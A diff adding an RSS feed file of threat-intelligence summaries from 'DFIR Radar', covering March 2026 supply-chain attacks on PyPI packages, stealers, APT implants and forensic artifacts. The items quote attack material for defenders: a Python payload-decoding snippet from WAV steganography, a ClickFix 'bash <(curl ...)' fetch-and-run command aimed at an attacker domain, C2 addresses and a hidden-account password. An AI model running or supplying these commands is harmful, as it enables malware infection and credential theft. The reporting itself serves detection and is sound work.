@@ -1,0 +1,775 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>DFIR Radar</title>
+    <link>https://x.com/DFIR_Radar</link>
+    <description>Keeping DFIR Intelligence on your Radar. The best DFIR research from hundreds of sources, filtered for relevance.</description>
+    <language>en</language>
+    <lastBuildDate>Sat, 28 Mar 2026 02:29:38 +0000</lastBuildDate>
+    <atom:link href="https://falhumaid.github.io/DFIR_Radar_Feed/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>Famous Telnyx Pypi Package compromised by TeamPCP</title>
+      <link>https://securityboulevard.com/2026/03/famous-telnyx-pypi-package-compromised-by-teampcp/</link>
+      <description>TeamPCP supply chain group compromises popular Telnyx PyPI package using WAV steganography. Third attack in 8 days delivers OS-specific payloads hidden in fake audio files, maintaining same C2 infrastructure across campaign waves.
+
+Key technical details:
+• Malicious versions 4.87.1 &amp; 4.87.2 published March 27, 2026 to PyPI
+• WAV steganography hides payloads: ringtone.wav (Linux/macOS Python script), hangup.wav (Windows PE)
+• C2 server 83.142.209.203:8080 serves different endpoints per OS detection
+• XOR decoding with 8-byte key embedded in audio frame data
+• Windows: drops msbuild.exe to %APPDATA%\Startup\ for persistence (T1547.001)
+• Linux/macOS: detached subprocess with start_new_session=True survives parent termination
+
+Payload extraction technique:
+```python
+raw = base64.b64decode(w.readframes(w.getnframes()))
+s, data = raw[:8], raw[8:]
+payload = bytes([data[i] ^ s[i % len(s)] for i in range(len(data))])
+```
+
+Same infrastructure as previous LiteLLM attack: identical RSA keys, tpcp.tar.gz exfil format, AES-256-CBC + RSA-OAEP encryption.
+
+Hunt for outbound connections to 83.142.209.203:8080 and check Python site-packages for unexpected WAV downloads or XOR operations in import-time code.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037606063059443955">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 19:01:57 +0000</pubDate>
+      <guid isPermaLink="false">2037606063059443955</guid>
+    </item>
+    <item>
+      <title>TeamPCP Targets Telnyx Package in Latest PyPI Software Supply Chain Attack</title>
+      <link>https://www.infosecurity-magazine.com/news/teampcp-targets-telnyx-pypi-package/</link>
+      <description>TeamPCP compromised official Telnyx Python SDK on PyPI by stealing maintainer credentials, injecting credential-harvesting malware into versions 4.87.1 and 4.87.2. Group now partners with Vect ransomware for supply chain attacks.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037590946800365707">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 18:01:53 +0000</pubDate>
+      <guid isPermaLink="false">2037590946800365707</guid>
+    </item>
+    <item>
+      <title>TeamPCP Supply Chain Campaign: Update 002 - Telnyx PyPI Compromise, Vect Ransomware Mass Affiliate Program, and First Named Victim Claim, (Fri, Mar 27th)</title>
+      <link>https://isc.sans.edu/diary/rss/32838</link>
+      <description>TeamPCP supply chain attack expands with Telnyx PyPI package compromise and Vect ransomware affiliate recruitment. SANS tracking active campaign with first confirmed victim claims emerging.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037575848761434509">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 17:01:53 +0000</pubDate>
+      <guid isPermaLink="false">2037575848761434509</guid>
+    </item>
+    <item>
+      <title>Under CTRL: Dissecting a Previously Undocumented Russian .Net Access Framework</title>
+      <link>https://censys.com/blog/under-ctrl-dissecting-a-previously-undocumented-russian-net-access-framework/</link>
+      <description>Russian 🇷🇺-origin "CTRL" toolkit discovered combining credential phishing, keylogging, RDP hijacking, and FRP tunneling in single .NET framework. Zero detections across VirusTotal and public feeds indicate privately developed tool not yet in broad circulation.
+
+Key Technical Details:
+• Delivery via weaponized LNK (Private Key.lnK) executing 6-stage payload chain through PowerShell, registry storage, and AES-256-CBC encrypted .NET assemblies
+• Infrastructure: hui228[.]ru (194.33.61[.]36, 109.107.168[.]18) on Partner Hosting LTD AS215826, FRP server port 7000 with auth token "ADAD"
+• Sophisticated Windows Hello phishing using victim's real display name/photo, UI automation to validate PINs against actual Windows auth, blocked escape keys (Alt+Tab/F4/Win)
+• Persistence via 4 scheduled tasks (DriverSvcTask, NetTcpSvc, TermSvcHost, WindowsHealthMonitor) loading payloads from registry values disguised as Explorer settings
+• C2 architecture routes all interaction through FRP reverse tunnels to RDP sessions, avoiding traditional beacon patterns
+
+DFIR Artifacts:
+• Registry: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ values ShellStateVersion1/IconSizeVersion1/IconUnderlineVersion1
+• Files: C:\ProgramData\SystemTools\ctrl.exe, C:\Temp\keylog.txt, C:\ProgramData\frp\frpc.toml
+• Named pipe: ctrlPipe for local C2 communication
+• Hidden user accounts (Administrator/Admin/Windows) with password "ADAD"
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037545573557862660">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 15:01:35 +0000</pubDate>
+      <guid isPermaLink="false">2037545573557862660</guid>
+    </item>
+    <item>
+      <title>Threat Hunting with OpenCTI + OpenAEV + Splunk ESCU</title>
+      <link>https://filigran.io/threat-hunting-with-opencti-openaev-splunk-escu/</link>
+      <description>Comprehensive framework for intelligence-driven threat hunting using OpenCTI PIRs to scope hypotheses, Splunk ESCU detections mapped to ATT&amp;CK, and OpenAEV simulation to validate coverage gaps.
+
+#DFIR_Radar</description>
+      <category>DETECTION</category>
+      <source url="https://x.com/DFIR_Radar/status/2037530480828875017">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 14:01:37 +0000</pubDate>
+      <guid isPermaLink="false">2037530480828875017</guid>
+    </item>
+    <item>
+      <title>Microsoft Power BI API Credential Exposure: From Public Postman Workspace to Data Exfiltration in…</title>
+      <link>https://infosecwriteups.com/microsoft-power-bi-api-credential-exposure-from-public-postman-workspace-to-data-exfiltration-in-849d2335f330?source=rss----7b722bfd1b8d---4</link>
+      <description>Asian government emergency services exposed live dispatch records and personnel data via Power BI credentials left in public Postman workspace. API access skipped entire kill chain—no exploitation needed.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037515404915126726">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 13:01:42 +0000</pubDate>
+      <guid isPermaLink="false">2037515404915126726</guid>
+    </item>
+    <item>
+      <title>Reflecting on Your Tier Model: CVE-2025-33073 and the One-Hop Problem</title>
+      <link>https://www.praetorian.com/blog/cve-2025-33073-ntlm-reflection-one-hop/</link>
+      <description>CVE-2025-33073 resurrects NTLM reflection attacks, enabling domain compromise through unconstrained delegation hosts without admin access. Any domain user can now exploit unpatched systems to capture DC TGTs and DCSync.
+
+#DFIR_Radar</description>
+      <category>VULNERABILITY</category>
+      <source url="https://x.com/DFIR_Radar/status/2037500449629294592">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 12:02:17 +0000</pubDate>
+      <guid isPermaLink="false">2037500449629294592</guid>
+    </item>
+    <item>
+      <title>Bogus Avast website fakes virus scan, installs Venom Stealer instead</title>
+      <link>https://www.malwarebytes.com/blog/threat-intel/2026/03/bogus-avast-website-fakes-virus-scan-installs-venom-stealer-instead</link>
+      <description>Fake Avast website delivers Venom Stealer via bogus virus scans, masquerading as Chrome service (v20svc.exe) to steal browser sessions, crypto wallets, and credentials. Uses direct syscalls to evade EDR detection.
+
+#DFIR_Radar</description>
+      <category>MALWARE ANALYSIS</category>
+      <source url="https://x.com/DFIR_Radar/status/2037485597292679572">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 11:03:16 +0000</pubDate>
+      <guid isPermaLink="false">2037485597292679572</guid>
+    </item>
+    <item>
+      <title>China-linked Red Menshen APT deploys stealthy BPFDoor implants in telecom networks</title>
+      <link>https://securityaffairs.com/190029/malware/china-linked-red-menshen-apt-deploys-stealthy-bpfdoor-implants-in-telecom-networks.html</link>
+      <description>Chinese 🇨🇳 Red Menshen APT deploys BPFDoor kernel-level implants in Middle Eastern and Asian telecom networks since 2021. These "digital sleeper cells" activate via magic packets, bypassing traditional detection methods.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037455094946402582">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 09:02:03 +0000</pubDate>
+      <guid isPermaLink="false">2037455094946402582</guid>
+    </item>
+    <item>
+      <title>EtherRAT Techniques Bypass Security Via Ethereum Smart Contracts</title>
+      <link>https://www.infosecurity-magazine.com/news/etherrat-bypass-security-ethereum/</link>
+      <description>EtherRAT malware uses Ethereum smart contracts to hide C2 infrastructure, allowing cheap rotation and avoiding takedowns. Node.js-based backdoor steals crypto wallets and cloud credentials after ClickFix initial access.
+
+#DFIR_Radar</description>
+      <category>MALWARE ANALYSIS</category>
+      <source url="https://x.com/DFIR_Radar/status/2037439838182605195">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 08:01:26 +0000</pubDate>
+      <guid isPermaLink="false">2037439838182605195</guid>
+    </item>
+    <item>
+      <title>AI Infrastructure LiteLLM Supply Chain Poisoning Alert</title>
+      <link>https://nsfocusglobal.com/ai-infrastructure-litellm-supply-chain-poisoning-alert/</link>
+      <description>TeamPCP group compromised LiteLLM AI gateway via supply chain poisoning, stealing 500K credentials including SSH keys, cloud certs, and K8s tokens. Malicious versions 1.82.7/1.82.8 deployed backdoors across infected clusters.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037409781762170899">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 06:02:00 +0000</pubDate>
+      <guid isPermaLink="false">2037409781762170899</guid>
+    </item>
+    <item>
+      <title>Iran-Linked Pay2Key Ransomware Group Re-Emerges</title>
+      <link>https://www.infosecurity-magazine.com/news/iranlinked-pay2key-ransomware/</link>
+      <description>Iranian 🇮🇷 Pay2Key ransomware returns with enhanced anti-forensics capabilities, targeting US 🇺🇸 healthcare via TeamViewer persistence and credential harvesting. Group completed full infrastructure encryption in 3 hours while destroying evidence.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037364425896644853">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 03:01:46 +0000</pubDate>
+      <guid isPermaLink="false">2037364425896644853</guid>
+    </item>
+    <item>
+      <title>Your AI Gateway Was a Backdoor: Inside the LiteLLM Supply Chain Compromise</title>
+      <link>https://www.trendmicro.com/en_us/research/26/c/inside-litellm-supply-chain-compromise.html</link>
+      <description>TeamPCP's sophisticated supply chain attack compromised LiteLLM AI proxy service, exposing concentrated API keys and cloud credentials across multiple ecosystems. Demonstrates AI gateways as critical attack vectors in modern infrastructure.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037349722298405030">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 02:03:21 +0000</pubDate>
+      <guid isPermaLink="false">2037349722298405030</guid>
+    </item>
+    <item>
+      <title>Researchers uncover WebRTC skimmer bypassing traditional defenses</title>
+      <link>https://securityaffairs.com/190002/malware/researchers-uncover-webrtc-skimmer-bypassing-traditional-defenses.html</link>
+      <description>New payment skimmer uses WebRTC DataChannels instead of HTTP to steal card data, bypassing CSP controls and network detection. Exploits PolyShell in Magento stores with encrypted UDP traffic invisible to standard security tools.
+
+#DFIR_Radar</description>
+      <category>MALWARE ANALYSIS</category>
+      <source url="https://x.com/DFIR_Radar/status/2037334777976467486">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 01:03:58 +0000</pubDate>
+      <guid isPermaLink="false">2037334777976467486</guid>
+    </item>
+    <item>
+      <title>WebRTC Skimmer Bypasses CSP to Steal Payment Data from E-Commerce Sites</title>
+      <link>https://thehackernews.com/2026/03/webrtc-skimmer-bypasses-csp-to-steal.html</link>
+      <description>New payment skimmer bypasses CSP using WebRTC data channels instead of HTTP requests to load payloads and exfiltrate stolen payment data from e-commerce sites. Hunt for unusual WebRTC connections in browser network activity.
+
+#DFIR_Radar</description>
+      <category>MALWARE ANALYSIS</category>
+      <source url="https://x.com/DFIR_Radar/status/2037319318489202712">DFIR Radar</source>
+      <pubDate>Fri, 27 Mar 2026 00:02:32 +0000</pubDate>
+      <guid isPermaLink="false">2037319318489202712</guid>
+    </item>
+    <item>
+      <title>Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government</title>
+      <link>https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/</link>
+      <description>Unit 42 identifies multiple cyberespionage clusters targeting Southeast Asian government with USBFect, RATs and custom loaders. Coordinated campaign suggests high-value intelligence collection operation.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037304132185608647">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 23:02:11 +0000</pubDate>
+      <guid isPermaLink="false">2037304132185608647</guid>
+    </item>
+    <item>
+      <title>TeamPCP Expands Supply Chain Campaign With LiteLLM PyPI Compromise</title>
+      <link>https://www.infosecurity-magazine.com/news/teampcp-litellm-pypi-supply-chain/</link>
+      <description>TeamPCP compromised LiteLLM PyPI package (95M+ downloads) with credential-stealing malware targeting Kubernetes environments. Malicious versions 1.82.7/1.82.8 harvested SSH keys, cloud creds, and crypto wallets before installing backdoors.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037288909198250481">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 22:01:42 +0000</pubDate>
+      <guid isPermaLink="false">2037288909198250481</guid>
+    </item>
+    <item>
+      <title>Tracking &amp; Detecting GhostSocks Malware</title>
+      <link>https://www.darktrace.com/blog/phantom-footprints-tracking-ghostsocks-malware</link>
+      <description>GhostSocks malware converts compromised devices into residential proxies using SOCKS5/TLS, enabling threat actors to bypass IP detection with "clean" household IPs. Now bundled with Lumma Stealer for widespread distribution.
+
+#DFIR_Radar</description>
+      <category>MALWARE ANALYSIS</category>
+      <source url="https://x.com/DFIR_Radar/status/2037273852120829991">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 21:01:52 +0000</pubDate>
+      <guid isPermaLink="false">2037273852120829991</guid>
+    </item>
+    <item>
+      <title>TeamPCP Supply Chain Campaign: Update 001 - Checkmarx Scope Wider Than Reported, CISA KEV Entry, and Detection Tools Available, (Thu, Mar 26th)</title>
+      <link>https://isc.sans.edu/diary/rss/32834</link>
+      <description>TeamPCP supply chain campaign scope expanded beyond initial reports with new CISA KEV entry and detection tools now available. Campaign timeline spans Feb 28 initial access through March 24 LiteLLM PyPI compromise.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037258729310343262">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 20:01:46 +0000</pubDate>
+      <guid isPermaLink="false">2037258729310343262</guid>
+    </item>
+    <item>
+      <title>Disabling Security Features in a Locked BIOS</title>
+      <link>https://www.mdsec.co.uk/2026/03/disabling-security-features-in-a-locked-bios/</link>
+      <description>New MDSec research shows how to bypass BIOS locks by directly patching Dell UEFI firmware at flash level, disabling DMA protections while preserving secure appearance.
+
+#DFIR_Radar</description>
+      <category>FORENSICS</category>
+      <source url="https://x.com/DFIR_Radar/status/2037247547278770497">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 19:17:20 +0000</pubDate>
+      <guid isPermaLink="false">2037247547278770497</guid>
+    </item>
+    <item>
+      <title>Infiniti Stealer: a new macOS infostealer using ClickFix and Python/Nuitka</title>
+      <link>https://www.malwarebytes.com/blog/threat-intel/2026/03/infiniti-stealer-a-new-macos-infostealer-using-clickfix-and-python-nuitka</link>
+      <description>First documented macOS campaign combining ClickFix social engineering with Nuitka-compiled Python stealer. Infiniti Stealer bypasses traditional defenses by tricking users into running Terminal commands themselves.
+
+Key Technical Details:
+• ClickFix delivery via fake Cloudflare CAPTCHA at update-check[.]com, instructs users to paste: bash &lt;(curl -sSfL $(echo aHR0cHM6Ly91cGRhdGUtY2hlY2suY29tL20vN2Q4ZGYyN2Q5NWQ5 | base64 --decode))
+• Stage 1: Bash dropper removes quarantine flag (xattr -dr com.apple.quarantine), uses shared MacSync/SHub template
+• Stage 2: Nuitka-compiled Mach-O binary (~8.6MB) with KAY header signature (4b 41 59 28 b5 2f fd) + zstd compression
+• Stage 3: Python 3.11 stealer targeting browsers, Keychain, crypto wallets, .env files
+
+Evasion &amp; Exfiltration:
+• VM detection for any.run, Joe Sandbox, Hybrid Analysis, VMware, VirtualBox
+• Randomized execution delays, HTTP POST exfiltration
+• Telegram notifications to operators, queues credentials for server-side cracking
+
+Hunt for recent Mach-O binaries in /tmp/ with KAY headers, unsigned executables removing quarantine attributes, and outbound connections to low-reputation domains from Terminal processes.
+
+#DFIR_Radar</description>
+      <category>MALWARE ANALYSIS</category>
+      <source url="https://x.com/DFIR_Radar/status/2037243810363642016">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 19:02:30 +0000</pubDate>
+      <guid isPermaLink="false">2037243810363642016</guid>
+    </item>
+    <item>
+      <title>Elastic Security Labs uncovers BRUSHWORM and BRUSHLOGGER</title>
+      <link>https://www.elastic.co/security-labs/brushworm-targets-financial-services</link>
+      <description>Elastic Security Labs discovers BRUSHWORM backdoor and BRUSHLOGGER keylogger targeting South Asian 🇮🇳 financial institution. Custom malware pair features USB worm capabilities, broad file theft, and system-wide keystroke capture.
+
+Key technical details:
+• BRUSHWORM (paint.exe): Modular backdoor with AES-CBC encrypted config, scheduled task persistence (MSGraphics), anti-analysis checks (screen resolution, hypervisor detection), and USB propagation using social engineering filenames
+• BRUSHLOGGER (libcurl.dll): DLL side-loading keylogger with system-wide WH_KEYBOARD_LL hook, XOR encryption (key 0x43), mutex "Windows-Updates-KB852654856"
+• C2 infrastructure: resources.dawnnewsisl[.]com/updtdll with Let's Encrypt SSL certificate
+• File theft targets 40+ extensions including .doc, .xls, .ppt, .pdf, .pst, .py across removable/optical drives
+• Installation paths: C:\ProgramData\Photoes\Pics\ (main), C:\Users\Public\Libraries\ (modules), staging in C:\Users\Public\Systeminfo\
+
+DFIR artifacts:
+• Scheduled tasks: MSGraphics, MSRecorder using COM Task Scheduler
+• Registry persistence indicators and file hash tracking in C:\Users\Public\AppData\Roaming\NuGet\hashconfig
+• Multiple development versions (V1.exe, V2.exe, V4.exe) found on VirusTotal indicate active toolset refinement
+
+Hunt for scheduled tasks executing from unusual paths, monitor USB autorun creation, and baseline normal DLL side-loading behavior in your environment.
+
+#DFIR_Radar</description>
+      <category>MALWARE ANALYSIS</category>
+      <source url="https://x.com/DFIR_Radar/status/2037232281123803164">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 18:02:37 +0000</pubDate>
+      <guid isPermaLink="false">2037232281123803164</guid>
+    </item>
+    <item>
+      <title>Scarlet Goldfinch’s year in ClickFix</title>
+      <link>https://redcanary.com/blog/threat-intelligence/scarlet-goldfinch-clickfix/</link>
+      <description>Scarlet Goldfinch threat actor evolved through 7 distinct "epochs" of paste-and-run tactics in 2025, ranking as 6th most prevalent threat. Campaign demonstrates rapid adaptation to defenses with continuous command-line obfuscation techniques.
+
+Key Technical Details:
+• Evolution from fake browser updates to ClickFix/paste-and-run lures tricking users into executing malicious PowerShell/cmd commands
+• Epoch 7 (Jan 2026-present): Split download/execute using curl + mshta with delayed environment variable expansion (cmd.exe /v:on)
+• Advanced obfuscation: escape characters (^s^t^a^r^t^), substring variable manipulation to scramble commands like "curl"
+• Kill chain: Paste-and-run → HTA download → Remcos DLL sideloading → NetSupport Manager persistence
+• Final payloads include StealC and ArechClient2 info stealers
+
+Attack Methodology:
+• Initial access via compromised websites displaying fake CAPTCHA/error messages (T1204.004)
+• Creates 7-10 digit staging folders in AppData\Local for payload deployment
+• Uses legitimate executables for DLL sideloading to evade detection
+• Establishes persistence through NetSupport Manager remote access tool
+
+DFIR Artifacts:
+• Monitor for mshta.exe network connections and HTA file downloads
+• Hunt for curl commands with suspicious file extensions masquerading as PDFs
+• Look for tar -xf extraction in AppData\Local with random numeric folder names
+• Detection opportunity: cmd.exe /v:on flag usage with delayed variable expansion
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037213634628345908">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 17:02:35 +0000</pubDate>
+      <guid isPermaLink="false">2037213634628345908</guid>
+    </item>
+    <item>
+      <title>Coruna iOS exploit framework linked to Triangulation attacks</title>
+      <link>https://www.bleepingcomputer.com/news/security/coruna-ios-exploit-framework-linked-to-triangulation-attacks/</link>
+      <description>Coruna iOS exploit framework is an evolution of Operation Triangulation, now targeting A17/M3 chips and iOS 17.2 with 5 exploit chains using 23 vulnerabilities. Framework expanded from precision espionage to cryptocurrency theft campaigns.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037198361351127523">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 16:01:53 +0000</pubDate>
+      <guid isPermaLink="false">2037198361351127523</guid>
+    </item>
+    <item>
+      <title>GlassWorm attack installs fake browser extension for surveillance</title>
+      <link>https://www.malwarebytes.com/blog/news/2026/03/glassworm-attack-installs-fake-browser-extension-for-surveillance</link>
+      <description>GlassWorm targets developers via compromised npm/PyPI packages, then installs fake "Google Docs Offline" Chrome extension for surveillance. Uses Solana blockchain for C2 discovery and DHT lookups to evade detection.
+
+#DFIR_Radar</description>
+      <category>MALWARE ANALYSIS</category>
+      <source url="https://x.com/DFIR_Radar/status/2037183518351253622">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 15:02:55 +0000</pubDate>
+      <guid isPermaLink="false">2037183518351253622</guid>
+    </item>
+    <item>
+      <title>BPFdoor in Telecom Networks: Sleeper Cells in the Backbone</title>
+      <link>https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report</link>
+      <description>Chinese 🇨🇳 APT group Red Menshen plants kernel-level BPFdoor backdoors in global telecom networks, creating "sleeper cells" for long-term espionage. New variants hide in HTTPS traffic and monitor 4G/5G signaling protocols.
+
+Key findings:
+• BPFdoor evolved from magic packet activation to Layer-7 HTTPS camouflage with RC4-MD5 encryption
+• Implants target SCTP signaling protocols used in 4G/5G core networks for subscriber tracking
+• Masquerades as legitimate services like HPE ProLiant hardware daemons and Docker containers
+• ICMP tunneling enables covert C2 between compromised hosts using 0xFFFFFFFF terminal markers
+• Affects telecom edge infrastructure: Ivanti VPNs, Cisco/Juniper routers, Fortinet firewalls
+
+Attack chain leverages:
+• Initial access via T1190 exploitation of public-facing telecom appliances
+• CrossC2 beacons for Linux post-exploitation and lateral movement
+• TinyShell passive backdoors on boundary devices for persistence
+• Custom keyloggers with telecom-specific credential lists (usernames like "imsi")
+
+DFIR artifacts include raw socket usage, anomalous BPF filters in kernel space, unexpected hardware service processes on non-HPE systems, and HTTPS traffic with fixed-offset padding schemes.
+
+Hunt for unusual BPF syscalls, processes mimicking bare-metal hardware services on virtualized systems, and SCTP traffic inspection on non-telecom hosts.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037168338401374612">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 14:02:35 +0000</pubDate>
+      <guid isPermaLink="false">2037168338401374612</guid>
+    </item>
+    <item>
+      <title>Kubernetes forensics 1/3 : what the container ?</title>
+      <link>https://www.synacktiv.com/en/publications/kubernetes-forensics-13-what-the-container.html</link>
+      <description>Synacktiv breaks down container forensics fundamentals as Kubernetes attacks surge in 2025. Essential primer on analyzing Docker vs Podman environments, OverlayFS artifacts, and containerized threat hunting techniques.
+
+Container architecture deep dive:
+• Containers = Linux processes with namespaces, cgroups, seccomp isolation (not VMs)
+• Docker uses daemon + containerd + runc stack; Podman is daemonless with conmon + crun
+• OCI specifications enable cross-platform compatibility (Runtime, Image, Distribution specs)
+• OverlayFS layers: UpperDir (runtime changes), LowerDir (base image), MergedDir (combined view)
+
+Key forensic artifacts:
+• Docker: /var/lib/docker/overlay2/, /var/lib/docker/containers/&lt;id&gt;/&lt;id&gt;.log, config.v2.json
+• Podman rootless: ~/.local/share/containers/storage/, journalctl CONTAINER_ID_FULL=&lt;id&gt;
+• Engine logs via journalctl -xeu docker.service or podman events --since &lt;date&gt;
+
+Investigation tools:
+• Live: docker/podman export, save, diff, cp commands for container extraction
+• Postmortem: wagoodman/dive for layer analysis, diffoci for image comparison, docker-explorer for mounting
+
+Hunt for unauthorized files in UpperDir layers and compare suspicious images against known-good baselines using diffoci to identify tampering.
+
+#DFIR_Radar</description>
+      <category>FORENSICS</category>
+      <source url="https://x.com/DFIR_Radar/status/2037153116282290316">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 13:02:06 +0000</pubDate>
+      <guid isPermaLink="false">2037153116282290316</guid>
+    </item>
+    <item>
+      <title>An AI gateway designed to steal your data</title>
+      <link>https://securelist.com/litellm-supply-chain-attack/119257/</link>
+      <description>Supply chain attack compromises LiteLLM Python library used by AI developers worldwide. Attackers injected data-stealing malware into PyPI versions, targeting cloud credentials, databases, and Kubernetes infrastructure.
+
+Key technical details:
+• Compromised versions litellm==1.82.7 &amp; 1.82.8 on PyPI (March 24, 2026)
+• Malicious code in proxy_server.py (v1.82.7) and litellm_init.pth (v1.82.8) 
+• Base64-encoded payload creates p.py, exfiltrates data via AES-256-CBC + RSA encryption
+• C2 domains: models[.]litellm[.]cloud, checkmarx[.]zone
+
+Attack methodology:
+• Targets AWS IMDS (169.254.169.254), ECS metadata (169.254.170.2) for runtime secrets
+• Steals SSH keys, .env files, database configs, crypto wallets, Slack/Discord webhooks
+• Kubernetes privilege escalation via securityContext.privileged=true pods
+• Persistence through /root/.config/sysmon/sysmon.py registered as systemd service
+
+DFIR artifacts:
+• ~/.config/sysmon/sysmon.py files on compromised hosts
+• /tmp/.pg_state, /tmp/pglog, session.key, tpcp.tar.gz files
+• Suspicious privileged pods with hostPath mounts in K8s clusters
+• Network connections to C2 infrastructure
+
+Global impact spans Russia 🇷🇺, China 🇨🇳, Brazil 🇧🇷, Netherlands 🇳🇱, UAE 🇦🇪 with secondary NodeJS variant targeting Checkmarx extensions.
+
+Hunt for Base64-encoded Python files executing at interpreter startup and unusual sysmon processes outside legitimate Microsoft Sysmon deployments.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037138193674293627">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 12:02:48 +0000</pubDate>
+      <guid isPermaLink="false">2037138193674293627</guid>
+    </item>
+    <item>
+      <title>Active Magecart Campaign Targets Spain, Leveraging Redsys Payment Mimicry and Hijacking</title>
+      <link>/cybersecurity-blog/banks-magecart-campaign/</link>
+      <description>24-month Magecart campaign hijacks Spanish 🇪🇸 e-commerce checkout flows using Redsys payment mimicry and WebSocket exfiltration across 100+ domains. Hunt for suspicious jQuery/CDN domains and WebSocket connections during checkout processes.
+
+#DFIR_Radar</description>
+      <category>MALWARE ANALYSIS</category>
+      <source url="https://x.com/DFIR_Radar/status/2037122822003450286">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 11:01:43 +0000</pubDate>
+      <guid isPermaLink="false">2037122822003450286</guid>
+    </item>
+    <item>
+      <title>ip6.arpa Wildcard Abuse: Hunting Phishing Infrastructure Across IPv6 Prefixes</title>
+      <link>https://www.cloudsek.com/blog/ip6-arpa-wildcard-abuse-hunting-phishing-infrastructure-across-ipv6-prefixes</link>
+      <description>Attackers abusing ip6.arpa wildcard DNS entries to bypass traditional blocklists and email security controls in phishing campaigns. This IPv6 technique creates critical blind spots in standard detection mechanisms.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037107875999605140">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 10:02:20 +0000</pubDate>
+      <guid isPermaLink="false">2037107875999605140</guid>
+    </item>
+    <item>
+      <title>VU#330121: IDrive for Windows contains local privilege escalation vulnerability</title>
+      <link>https://kb.cert.org/vuls/id/330121</link>
+      <description>IDrive for Windows (≤7.0.0.63) allows any authenticated user to escalate to SYSTEM via writable files in C:\ProgramData\IDrive that control service execution (CVE-2026-1995). Restrict directory permissions until patch arrives.
+
+#DFIR_Radar</description>
+      <category>VULNERABILITY</category>
+      <source url="https://x.com/DFIR_Radar/status/2037092923121016924">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 09:02:55 +0000</pubDate>
+      <guid isPermaLink="false">2037092923121016924</guid>
+    </item>
+    <item>
+      <title>Exploring windows artifacts notepad files | u0041</title>
+      <link>https://u0041.co/posts/articals/exploring-windows-artifacts-notepad-files/</link>
+      <description>New Windows 11 Notepad artifacts reveal detailed user activity including file content, editing history, and unsaved changes. TabState files in %LOCALAPPDATA%\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState contain comprehensive forensic evidence.
+
+Key technical details:
+• Files stored as &lt;GUID&gt;.bin in TabState folder with complete structure documented
